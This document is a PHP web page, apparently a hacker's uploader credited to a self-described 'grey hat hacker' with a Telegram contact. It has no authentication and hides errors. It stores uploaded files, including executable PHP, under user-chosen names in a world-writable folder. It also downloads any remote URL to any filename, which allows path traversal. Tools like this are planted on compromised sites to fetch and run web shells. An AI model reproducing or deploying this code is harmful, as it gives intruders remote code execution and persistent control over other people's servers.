<?php
error_reporting(0);

$uploadDir = "uploads/";
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

$response = ""; // Default response

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_FILES['file'])) {
        // Handle direct file upload
        $file = $_FILES['file'];
        $newFileName = $file['name']; // Keep original filename
        $uploadPath = $uploadDir . $newFileName;

        if (move_uploaded_file($file['tmp_name'], $uploadPath)) {
            $response = "<div class='success'>✅ File uploaded successfully: <a href='$uploadPath' target='_blank'>$uploadPath</a></div>";
        } else {
            $response = "<div class='error'>❌ Upload failed.</div>";
        }
    } elseif (!empty($_POST['url']) && !empty($_POST['filename'])) {
        // Handle URL-based file upload
        $fileUrl = $_POST['url'];
        $filePath = $uploadDir . $_POST['filename']; // Save as given filename

        $fileContent = file_get_contents($fileUrl);
        if ($fileContent !== false && file_put_contents($filePath, $fileContent)) {
            $response = "<div class='success'>✅ File downloaded & uploaded: <a href='$filePath' target='_blank'>$filePath</a></div>";
        } else {
            $response = "<div class='error'>❌ Failed to fetch file.</div>";
        }
    } else {
        $response = "<div class='error'>❌ No valid input provided.</div>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced File & URL Uploader</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #121212;
            color: #fff;
            text-align: center;
            padding: 20px;
        }
        .container {
            background: #1e1e1e;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 255, 170, 0.2);
            max-width: 450px;
            margin: auto;
            animation: fadeIn 1s ease-in-out;
        }
        h2 {
            color: #00ffaa;
            font-weight: bold;
        }
        input, button {
            margin: 10px 0;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            border: none;
            font-size: 16px;
        }
        input {
            background: #2c2c2c;
            color: #fff;
            outline: none;
        }
        button {
            background: #00ffaa;
            color: #121212;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s ease;
        }
        button:hover {
            background: #00cc88;
        }
        .output {
            margin-top: 20px;
            padding: 10px;
            background: #222;
            border-radius: 5px;
            word-wrap: break-word;
        }
        .success {
            color: #00ff88;
        }
        .error {
            color: #ff4444;
        }
        a {
            color: #00ffcc;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .author-info {
            margin-top: 20px;
            font-size: 14px;
            color: #00ffaa;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>📂 Advanced File & URL Uploader</h2>

        <!-- File Upload -->
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">📤 Upload File</button>
        </form>

        <hr style="border-color: #00ffaa;">

        <!-- URL-Based Upload -->
        <form method="POST">
            <input type="text" name="url" placeholder="Enter file URL" required>
            <input type="text" name="filename" placeholder="Enter filename (with extension)" required>
            <button type="submit">🌍 Fetch & Upload</button>
        </form>

        <div class="output"><?= $response ?></div>

        <!-- Author Information -->
        <div class="author-info">
            <p>Created by: MAD TIGER</p>
            <p>BD GREY HAT HACKER</p>
            <p>TeleGram: <a href="https://t.me/DevidLuice" target="_blank">@DevidLuice</a></p>
        </div>
    </div>
</body>
</html>
